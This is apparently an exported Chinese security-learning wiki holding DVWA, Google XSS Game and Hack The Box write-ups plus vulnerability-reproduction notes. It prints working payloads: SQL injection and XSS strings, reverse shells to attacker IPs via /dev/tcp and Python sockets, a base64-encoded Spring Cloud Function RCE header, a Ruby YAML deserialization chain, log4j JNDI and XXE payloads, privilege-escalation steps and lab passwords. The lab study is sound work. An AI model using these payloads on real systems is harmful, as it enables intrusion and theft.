小白网络安全入门之_DVWA全系列_哔哩哔哩_bilibili DVWA通关教程（上） DVWA 入门靶场学习记录 前言 https://github.com/digininja/DVWA 模块大榄 Brute Force（暴力破解） Command Injection（命令行注入） CSRF（跨站请求伪造） File Inclusion（文件包含） File Upload（文件上传） Insecure CAPTCHA（不安全的验证码） SQL Injection（SQL注入） SQL Injection (Blind)（SQL盲注） XSS (Reflected)（反射型跨站脚本） XSS (Stored)（存储型跨站脚本） DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容 通关开始 第一关-Brute Force LOW PHP 代码——查询验证用户名和密码 1$query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; PHP 代码——登录前的验证 123456789# 请求不为空，查得到结果就行 if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; # 输出头像和用户名 $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; &#125; else &#123; 登录失败 &#125; SQL 在登录框中输入 12admin&#x27; or &#x27;1&#x27; = &#x27;1admin&#x27; or &#x27;1&#x27; = &#x27;2 123SELECT * FROM `users` WHERE user = &#x27;admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; AND password = &#x27;&#x27;-- or 一个为真，即可为真 Medium PHP 代码 1$user = mysql_real_escape_string( $user ); 单引号没有了，变成了转义\\ 1GET /DVWA-master/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login HTTP/1.1 High 多了token这个参数，过滤低级的爆破，校验 先抓包，火狐浏览器地址栏是明文的 1234567891011GET /DVWA-master/vulnerabilities/brute/?username=amdin&amp;password=123&amp;Login=Login&amp;user_token=1884203513ab2b438bc4ec3182f62a65 HTTP/1.1多了这一段&amp;user_token=1884203513ab2b438bc4ec3182f62a65点击 intercept is on 变成了 intercept is off紧接着看网站浏览器的地址栏http://localhost/DVWA-master/vulnerabilities/brute/?username=amdin&amp;password=123&amp;Login=Login&amp;user_token=1884203513ab2b438bc4ec3182f62a65#接着开始改 Python 脚本 第二关-Command Injection LOW php 代码 123456789101112131415161718192021&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 网页输入 1127.0.0.1 &amp;&amp; ipconfig Medium High 第三关-CSRF 跨站请求伪造，有人戏谑为借刀杀人，借用户之刀，做恶行之事也 LOW 映入眼帘的是一个修改密码的界面，输入密码之后123 123 后，在地址栏中观察到 从而得知这是 GET 型提交，且这就是修改密码的链接。我们直接在地址栏中修改密码456，然后复制链接重新打开一个界面（需要注意的是，打开的界面必须在同一个浏览器，原因是 cookie 认证） 如图所示显示密码已更改，同时原密码123失效了。 但显然，长而冗杂的链接是令人厌烦的，诱导用户点击的话，可以通过构造短链接的形式，直接搜索“在线 短链接”即可找到 如何查看重定向之前的链接呢，可以借用curl -i url Medium 和 Low 级别相比，增添了 referer 判断。 referer 作为 HTTP 头中的一个字段，记录了 HTTP 请求的来源地址。 通过输入密码 123，通过 burp 抓包看看。 重复上次的操作，重新打开一个界面，在 burp 中进行抓包，发现没有 referer 字段 接下来可以在 burp 中手动伪造 referer 来执行 CSRF 攻击 1Referer: http://localhost/DVWA-master/vulnerabilities/csrf/ High 增加了 token 机制，当用户往服务器发送请求的时候，服务器通过校验请求是否携带正确的 Token，才会响应请求。 因为 GET 请求的参数会暴露在 URL 中，所以输入密码之后查看一下 token 第十关-XSS (DOM) Low 12345document.write(&quot;&lt;option value=&#x27;&quot; + lang + &quot;&#x27;&gt;&quot; + $decodeURI(lang) + &quot;&lt;/option&gt;&quot;);document.write(&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;);// payload?default=English &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; Medium 123456789if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; // stripos() 函数 --&gt; 查找 &quot;&lt;script&quot; 在字符串（default 变量）中第一次出现的位置：// header函数 --&gt; Location类型的标头是一种特殊的header调用，常用来实现页面跳转。匹配通过将跳转 ?default=English // input 事件，制造一个 input 输入框，当 onclick 点击的时候触发 xss 攻击?default=English&lt;input onclick=alert(&#x27;XSS&#x27;) /&gt; High 1234567891011121314151617181920if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit;// switch 语句 --&gt; 有选择地执行若干代码块之一// !is_null --&gt; 检测变量是否不为 NULL。// 如果 default 变量的值不为 French、English……这些，default 变量就重置为 ?default=English// 闭合 option 和 select 标签，然后使用 # 来注释?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;?default=English#&lt;input onclick=alert(&#x27;XSS&#x27;) /&gt; 第十一关-XSS (Reflected) LOW 12345678910// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user $html .= &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;// 从源代码中可看到没有对 name 做其他限制，只检测了 != null 且变量存在// payload&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; Medium 12345678if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // 从源代码中可以看到 &lt;script&gt; 标签进行了过滤，那就换个标签// payload&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt; High 123456&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;// 正则表达式过滤，script 不区分大小写，并且使用了通配符 * 匹配// payload&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt; 第十二关-XSS (Stored) LOW 123// payloadName: 1Message: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; 123456-- 从数据库中查看mysql -u root -prootSHOW DATABASES;USE `dvwa`select * from guestbook;delete from guestbook; Medium 123456// payloadName: &lt;Script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;Message: www.sqlsec.comName: &lt;s&lt;script&gt;cript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;Message: www.sqlsec.com High 123// payloadName: &lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;Message: www.sqlsec.com","tags":[null],"categories":[null]},{"title":"Google XSS Game","path":"/wiki/XSS-and-Security-Labs/Google XSS Game.html","content":"XSS game (xss-game.appspot.com) 这是一款谷歌的 XSS 游戏，总共有 6 个级别 Level 1 无需转义，直接编辑 URL 栏或者搜索框中都可以执行 1&lt;script&gt;alert(1)&lt;/script&gt; Level 2 留言板中放入&lt;script&gt;alert(1)&lt;/script&gt;发现不弹窗，说明&lt;script&gt; 标签不起作用，转译成了HTML实体，可以选择其他能够触发 JavaScript 代码的命令 12// 标签与属性一起使用，onerror 事件会在文档或图像加载过程中发生错误时被触发。&lt;img src=&#x27;#&#x27; onerror=alert(1) /&gt; Level 3 123456// 查看源代码function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&#x27;/static/level3/cloud&quot; + num + &quot;.jpg&#x27; /&gt;&quot;; $(&#x27;#tabContent&#x27;).html(html); 12// 用 &#x27; 闭合 src 属性，用 /&gt; 闭合 img 标签&#x27; onerror=&#x27;alert(1)&#x27;/&gt; Level 4 123// 闭合 startTimer() 函数，用 , 连接写入 alert() 方法// onload 事件在图片加载完成后立即执行100&#x27;),alert(&#x27;1 Level 5 12345// 这是基于 DOM 的 XSS，在邮件中插入javascript:alert(1)// 插入后&lt;a href=&quot;javascript:alert(1)&quot;&gt; Level 6 Data URL - HTTP | MDN (mozilla.org) 在浏览器中，有一些用于访问资源或脚本的协议，称作伪协议 data 伪协议 12// Data URL，允许内容创建者向文档中嵌入小文件data:text/javascript,alert(1)","tags":[null],"categories":[null]},{"title":"Inject — Hack The Box Machine","path":"/wiki/XSS-and-Security-Labs/Inject.html","content":"https://app.hackthebox.com/machines/Inject 参考： Google 搜索：Inject Hack The Box https://blog.csdn.net/qq_58869808/article/details/129505388 ^v^ (cnblogs.com) HTB-Inject_永远是深夜有多好。的博客-CSDN博客 视频： https://www.youtube.com/watch?v=SU_hAavi9Oo&amp;pp=ygURaW5qZWN0IGhhY2t0aGVib3g%3D 连接 使用环境 VM ubuntu 123sudo openvpn lab_Wreath0690.ovpn10.10.11.204 侦查 1234# 初始端口扫描nmap -A 10.10.11.204# 仅有 22/tcp 和 8080/tcp 两个端口是开放的，其中22/tcp 端口运行的是 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)，8080/tcp 端口运行的是 Nagios NSCA 12touch png.png# 创建一个文件进行抓包 文件包含 FUZZ 路径，一层一层进行遍历，找到了 pom.xml 文件，发现 java 框架去 Google 搜索 EXP 1234密码：DocPhillovestoInject123用户：phil# ssh phil@10.10.11.204，连接不上 1234# 执行命令 curl http://10.10.11.204:8080/show_image?img=pass1.jpg?pass=id 得到了文件的绝对路径/var/www/WebApp/src/main/uploads/pass1.jpg%3Fpass=id&#123;&quot;timestamp&quot;:&quot;2023-05-19T02:46:22.638+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;URL [file:/var/www/WebApp/src/main/uploads/pass1.jpg%3Fpass=id] cannot be resolved in the file system for checking its content length&quot;,&quot;path&quot;:&quot;/show_image&quot;&#125;root@aloof-virtual-machine:/home/aloof/tools# 反向 shell 通过搜索找到 CVE 编号是「CVE-2022-22963」 CVE-2022-22963 是一个在 Spring Cloud Function 框架中存在的远程代码执行漏洞。它影响了3.1.6、3.2.2及更早的版本 当使用路由功能时，用户可以提供一个特制的 SpEL 作为路由表达式，可能导致远程代码执行和访问本地资源。 Vulhub - Docker-Compose file for vulnerability environment 1234567curl http://10.10.11.204:8080/show_image?img=../../../../WebApp/pom.xml# 返回信息，版本满足要求&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; 使用 burp 抓http://10.10.11.204:8080的数据包 12345678910GET / HTTP/1.1Host: 10.10.11.204:8080User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1 Vulhub 上的 123456789101112POST /functionRouter HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closespring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;)Content-Type: text/plainContent-Length: 4test 修改后 https://www.revshells.com/ 12345bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1# 通过 base64 加密YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=# 监听端口，获得 shell 权限nc -nvlp 9001 修改后的请求包 12345678910111213POST /functionRouter HTTP/1.1Host: 10.10.11.204:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Accept: */*Accept-Language: enAccept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)Content-Type: text/plainContent-Length: 4test 12345678910111213141516spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)# 这段代码是一个 HTTP 请求头的参数，它的名字是 spring.cloud.function.routing-expression，它的值是一个SpEL表达式。SpEL表达式是一种可以执行任意Java代码的语言.# 这个SpEL表达式的作用是调用java.lang.Runtime类的getRuntime()方法，得到一个Runtime对象，然后调用它的exec()方法，执行一个命令行。这个命令行是我们自己可以控制的地方bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;# 这个命令行的作用是先用 echo 命令输出一串 base64 编码的字符串，然后用 base64 命令解码它，然后用 bash 命令执行它bash -i &gt;&amp; /dev/tcp/10.10.16.39/9001 0&gt;&amp;1# 这个命令的作用是启动一个交互式的 bash shell，并且把它的输入和输出重定向到一个TCP连接上，连接的目标地址是 10.10.16.39:9001。这样就相当于在服务器上开启了一个反向 shell，攻击者可以在 10.10.16.39:9001 上监听并控制服务器。# 所以，这段代码的目的是利用 Spring Cloud Function 框架中存在的 SpEL 注入漏洞，执行任意代码，并在服务器上开启一个反向 shell，从而获取服务器的完全控制权。 12345678# 连接上之后，通过 whoami 命令发现当前用户是 frank，切换到 phil 用户密码：DocPhillovestoInject123用户：philsu phil# 在 /home/phil 目录下发现 user.txt 文件，用 cat 读取文件 提权 使用 sudo -l 发现没有提权的命令 ansible playbook代码来执行shell命令。 Ansible playbook 是一种用来在远程主机上执行一系列任务的文件，它使用YAML语法1。使用Ansible playbook来执行shell命令 1234- hosts: localhost tasks: - name: getroot command: sudo chmod u+s /bin/bash Playbook 用于将 /bin/bash 文件设置为 SUID 权限，以实现以 root 用户权限执行 Bash shell 的目的 1234567891011121314151617181920ifconfig# 用sudo权限运行python3的http.server模块1，它可以在本地主机上启动一个简单的HTTP服务器，用来共享文件和目录。sudo python3 -m http.server# 用wget命令从10.10.16.39:8000这个地址下载playbook_2.yml文件，这个地址是上面的HTTP服务器提供的。wget 10.10.16.39:8000/playbook_2.ymlbash -pid whoamicd /rootlscat root.txt","tags":[null],"categories":[null]},{"title":"Precious — Hack The Box Machine","path":"/wiki/XSS-and-Security-Labs/Precious.html","content":"介绍 在虚拟机中进行连接 1sudo openvpn 名称.ovpn 出现 Initialization Sequence Completed 代表连接成功 连接 参考： 主要参考——Hackthebox - Precious(Easy) - YouTube PreciousHTB | Hack The Box Precious| PreciousWriteUp | Hack The Box - YouTube Precious- YouTube 中等 (medium.com) Hackthebox PreciousWriteup – 0xDedinfosec Precious是 Hack the Box 上的一台简单机器，它托管了一个使用易受攻击的 pdfkit 版本的网站。使用此版本的 pdf kit 和 CVE-2022–25765，我们能够以 ruby 用户的身份获得计算机的反向 shell。然后，我们从配置文件中收集一些信息，以将我们的权限提升给其他用户。一旦我们成为用户 henry，我们就通过 YAML 反序列化使用远程代码执行将我们的权限提升给根用户。 地址：https://app.hackthebox.com/machines/513 110.10.11.189 常规探测 1234567# nmap 全端口扫描，发现开放了 22 和 80 端口，分别是 ssh 和 http 协议# -sC：运行端口侦测的默认 Nmap 脚本# -sV：探测开放端口以确定服务/版本信息nmap -sC -sV 10.10.11.18910.10.11.189:2210.10.11.189:80 网站能够输入一个 URL，它会将网页转换为 pdf 1exiftool iza6l21cttk715syc00tn5uzd4t4hgqz.pdf Google 直接搜索 pdfkit v0.8.6 vuln、pdfkit v0.8.6 exploit（意思就是搜索和 pdfkit v0.8.6 相关的漏洞 ） Command Injection in pdfkit | CVE-2022-25765 | Snyk ==找到了 PoC，把要执行的命令放在``中== 反弹 shell https://www.revshells.com/ 12# 需要设置一个侦听器，以便在获得反向 shell 后与机器进行交互。nc -nlvp 1113 12345678# 构造一个 payloadpython3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.13&quot;,1113));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;# 放入浏览器http://10.10.16.13?name=#&#123;&#x27;%20`放入 payload`&#x27;&#125;http://10.10.16.13?name=#&#123;&#x27;%20`python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.13&quot;,1113));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;`&#x27;&#125; 输入whoami，将会显示rudy 提权 1234567# ssh 登录ssh henry@10.10.11.189# 密码：Q3c1AqGHtoI0aXAYFHcat user.txt得到 flag 现在可以访问用户 henry，试一下可以用 root 权限运行吗，利用sudo -l 1234567-bash-5.1$ sudo -lMatching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb-bash-5.1$ 通过 YAML 远程执行代码的文章，发现可以通过 dependencies.yml 文件使用远程代码注入，该文件将由 /opt/update_dependencies.rb 运行 根据 sudo -l 命令的返回结果 这说明你的目标机器上的用户 henry 可以使用 sudo 命令来以 root 权限运行以下命令，而不需要输入密码： 1/usr/bin/ruby /opt/update_dependencies.rb 复制 这可能是一个提权的机会，如果你可以控制或者修改 /opt/update_dependencies.rb 这个文件，或者利用 ruby 的特性来执行任意命令。你可以尝试以下方法： 12345cat /opt/update_dependencies.rbcat# 发现 YAML.load(File.read(&quot;dependencies.yml&quot; )) 字段test file .yml 使用 nano 编辑器 在 nano 编辑器中，按下 Ctrl+O 组合键，这会提示你输入要保存的文件名。如果你不想改变文件名，直接按下 Enter 键即可。 如果你想要退出 nano 编辑器，按下 Ctrl+X 组合键，这会提示你是否要保存修改。如果你想要保存，按下 Y 键，然后按下 Enter 键。如果你不想要保存，按下 N 键。 123# 将 /tmp/1 添加到 PATH，您可以使系统能够在该目录中查找并执行命令。export PATH=/tmp/1:$PATHecho $PATH Google 搜索：file yml rce https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/ https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e56 12345678910111213141516171819---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#x27;Kernel&#x27; method_id: :system git_set: sh method_id: :resolve 123# 执行我们的命令sudo /usr/bin/ruby /opt/update_dependencies.rbpwd;id;whoami;ls -la;file root.txt","tags":[null],"categories":[null]},{"title":"MonitorsTwo — Hack The Box Machine","path":"/wiki/XSS-and-Security-Labs/MonitorsTwo.html","content":"介绍 破解盒子 ：： 破解盒子 (hackthebox.com) 10.10.11.211 参考 hackthebox MonitorsTwo渗透全过程 - YouTube htb monitorstwo wp记录_春猿火的博客-CSDN博客 MonitorsTwo WriteUp_Som3B0dy的博客-CSDN博客 FredBrave/CVE-2022-46169-CACTI-1.2.22：这是 CVE-2022-46169 对仙人掌 1.2.22 的攻击。此漏洞允许通过 RCE 获取计算机上的反向外壳。 (github.com) UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com) 探测 1nmap -A 10.10.11.211 底部看到版本信息——版本 1.2.22 | © 2004-2023 - The Cacti Group Google 搜索：The Cacti Group exploit CVE-2022-46169 反连 shell 123456789# 监听 nc -nlvp 443# 本机 git clone 把 python 脚本下载下载并且运行python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.29 --LPORT=443#-u http://10.10.11.211: 指定目标 URL 为 http://10.10.11.211。测试的目标网站#--LHOST=10.10.14.29: 指定本地主机的 IP 地址为 10.10.14.29。反向连接的 IP 地址。-#-LPORT=443: 指定本地主机的端口号为 443。接收反向连接的端口号。 12345678910111213141516171819202122cd /cat entrypoint.sh#!/bin/bashset -exwait-for-it db:3306 -t 300 -- echo &quot;database is connected&quot;if [[ ! $(mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;) =~ &quot;automation_devices&quot; ]]; then mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e &quot;UPDATE user_auth SET must_change_password=&#x27;&#x27; WHERE username = &#x27;admin&#x27;&quot; mysql --host=db --user=root --password=root cacti -e &quot;SET GLOBAL time_zone = &#x27;UTC&#x27;&quot;fichown www-data:www-data -R /var/www/html# first arg is `-f` or `--some-option`if [ &quot;$&#123;1#-&#125;&quot; != &quot;$1&quot; ]; then\tset -- apache2-foreground &quot;$@&quot;fiexec &quot;$@&quot;# -------------------------------------------------------------------------------------------------# 这个脚本的功能是等待数据库可用后，检查指定的表是否存在，如果不存在，则导入 SQL 文件并更新数据库中的记录。然后设置目录权限并执行传递给脚本的命令行参数。 123456789101112131415161718find / -perm -u=s 2&gt;/dev/null# find: 命令用于在文件系统中查找文件和目录。# /: 指定查找的起始路径为根目录。# -perm -u=s: 指定查找具有 Setuid 权限的文件。-perm 选项用于指定文件权限，-u 表示针对文件所有者的权限，=s 表示设置了 Setuid 权限的文件。# 2&gt;/dev/null: 将错误输出重定向到 /dev/null，即丢弃错误信息，以避免显示不必要的错误提示。/sbin/capsh --gid=0 --uid=0 --# 以 root 用户的身份运行 /sbin/capsh 工具，以便在修改进程权限和能力时拥有 root 权限whoami# 复制 entrypoint.sh 文件的命令mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;mysql --host=db --user=root --password=root cacti -e &quot;select * from user_auth&quot;# 找到 marcus 用户的密码$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 12345678# 本机hashcat -m 3200 -a 0 pass.txt /home/aloof/zidm/common-password-list/rockyou.txt# 使用 hashcat 工具对 `pass.txt` 文件中的 bcrypt 哈希值进行直接字典攻击，并使用 `/home/aloof/zidm/common-password-list/rockyou.txt` 字典文件ssh marcus@10.10.11.211$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 用户名 密码 明文 marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C funkymonkey 12345# www-data 用户cd /cd binls -al | grep bashchmod u+s bash UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091 (github.com) 12345# 本机git clone https://github.com/UncleJ4ck/CVE-2021-41091.gitifconfigsudo python3 -m http.server 123# marcus ./exp.shchmod +x exp.sh","tags":[null],"categories":[null]},{"title":"已知漏洞复现与验证","path":"/wiki/XSS-and-Security-Labs/Reproducible vulnerability.html","content":"以下是一些已知的漏洞及其相关信息，供研究和复现使用 CVE-2019-6341✔ 在 kali 上使用 vulhub 环境，先进入目录vulhub/drupal/CVE-2019-6341 123# 启动 docker，启用环境sudo service docker startdocker-compose up -d 在浏览器访问：http://127.0.0.1:8080 12345# 上传 POCphp blog-poc.php 127.0.0.1 8080# 访问，FireFox 过滤了 XSS，所以不弹窗http://127.0.0.1:8080/sites/default/files/pictures/2023-02/_0 漏洞利用 drupal 文件上传模块，文件内容是 HTML 代码，但 JS 代码包含其中 &lt;SCRIPT&gt;alert(123);&lt;/SCRIPT&gt; CVE 2014-4210✔ vulhub/weblogic/ssrf at master · vulhub/vulhub (github.com) 在 kali 上使用 vulhub 环境，先进入目录vulhub/weblogic/ssrf 123# 启动 docker，启用环境sudo service docker startdocker-compose up -d Weblogic 中存在一个 SSRF 漏洞，利用该漏洞可以发送任意 HTTP 请求，进而攻击内网中 redis、fastcgi 等脆弱组件。 访问http://127.0.0.1:7001/uddiexplorer/，查看 uddiexplorer 应用。 点击 Search Public Registries 进行抓包 未完…… thinkcmf-x1.6.0-x2.2.3✔ ThinkCMF 是一个基于 ThinkPHP 框架开发的内容管理框架。可利用此漏洞构造恶意的url，向服务器写入任意内容的文件，达到远程代码执行的目的 下载ThinkCMF2.2.2版本，X2.2.2 ·ThinkCMF/CMFX (github.com)，解压后放到 phpstudy 环境的 web 根目录下 然后，输入数据库密码 root，设置用户名、密码、邮箱等完成安装设置 log4j2-cve-2021-44228✔ 环境搭建 使用 vulhub，切换到漏洞目录 1cd /root/vulhub/log4j/CVE-2021-44228 漏洞复现 先利用 dnslog 查看回显，然后测试网站 1http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://f4ae3u.dnslog.cn&#125; 工具使用https://github.com/bkfish/Apache-Log4j-Learning/ 1git clone https://github.com/bkfish/Apache-Log4j-Learning.git 构造 payload 使用 base 64加密 1bash -i &gt;&amp; /dev/tcp/192.168.31.137/8983 0&gt;&amp;1 …… XXE 漏洞 | rrodrigo/xxelab✔ 环境搭建 1234# 下载镜像docker pull rrodrigo/xxelabdocker run -d -p 8082:80 rrodrigo/xxelab 将主机的 8082 端口映射到容器的 80 端口上，在浏览器中访问映射出来的端口，http://localhost:8082 漏洞复现 通过用 burp 抓包发现是 xml 格式 12345&lt;!DOCTYPE c [&lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot;&gt;]&gt;# 定义了一个名为 file 的实体，它的值是 /etc/passwd，这是一个包含系统用户信息的文件。 Tips / 提示 在 XML 中，实体是可以被引用的对象，类似于变量。当 XML 解析器解析包含该实体的 XML 文档时，它会将实体引用替换为实体的实际值。攻击者可以构造恶意的 XML 数据，将实体引用插入到数据中，从而让 XML 解析器读取和输出 /etc/passwd 文件的内容。 CVE-2017-12615（tomcat-pass-getshell） 环境搭建 使用 vuluhub 的 docker 进行漏洞复现 漏洞复现 …… CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台 先找到目录：vulhub/weblogic/CVE-2020-14882 12cd vulhub/weblogic/CVE-2020-14882 docker-compose up –d 2.进入 vulhub/weblogic/CVE-2020-14882 目录下，使用命令docker-compose up –d启动环境 3.浏览器访问：你的 ip:7001/console/login/LoginForm.jsp 成功访问表示环境搭建成功 log4j2-rce-2021-12-09 环境搭建 12345# 使用dockerdocker pull vulfocus/log4j2-rce-2021-12-09# 启动docker容器docker run -tid -p 38080:8080 vulfocus/log4j2-rce-2021-12-09 漏洞复现 ……未完待续 wordpress_cve_2019_15866 showdoc-cnvd_2020_26585 CVE-2019-9670（远程代码执行漏洞复现） CVE-2020-5412 phpmyadmin-cve_2014_8959","tags":[null],"categories":[null]},{"title":"Hackthebox 赛季靶场 Titanic Writeup","path":"/wiki/XSS-and-Security-Labs/Titanic.html","content":"靶机信息: IP 地址: 10.10.11.55 目标: 获取 user.txt 和 root.txt 一、 信息收集与初始探测 1. 端口扫描 (Nmap) 首先使用 Nmap 对目标进行端口扫描，了解开放的服务： 扫描结果显示开放了 22 (SSH) 和 80 (HTTP) 端口。HTTP 服务返回 302 重定向，指向域名 http://titanic.htb/。 2. 配置 Hosts 文件 为了正常访问 Web 服务，我们需要将域名和 IP 地址添加到本地 hosts 文件。 110.10.11.55 titanic.htb 3. 访问 Web 服务 配置好 hosts 文件后，在浏览器中访问 http://titanic.htb/。看到了一个关于泰坦尼克号邮轮预订的网站。 网站底部有一个预订信息的提交表单： 二、 Web 应用枚举与漏洞发现 1. 技术栈识别 (WhatWeb) 使用 whatweb 识别网站使用的技术： 1whatweb http://titanic.htb/ 关键信息： 后端：Werkzeug/3.0.3 (Python Web 框架) Python 版本：3.10.12 前端：Bootstrap, JQuery 2. 目录与子域名扫描 使用 dirsearch 扫描目录，但未发现有价值的信息（大多是 40x 错误）。 接着，使用 gobuster 结合子域名字典进行子域名爆破： 扫描发现了一个子域名 dev.titanic.htb。将其添加到 hosts 文件： 110.10.11.55 titanic.htb dev.titanic.htb 3. 表单提交与路径遍历漏洞 回到主站 http://titanic.htb/，尝试提交预订表单，并使用 Burp Suite 拦截请求和响应。 提交表单后，服务器返回一个 302 重定向，指向一个下载链接，格式为 /download?ticket=UUID.json。 这个 ticket 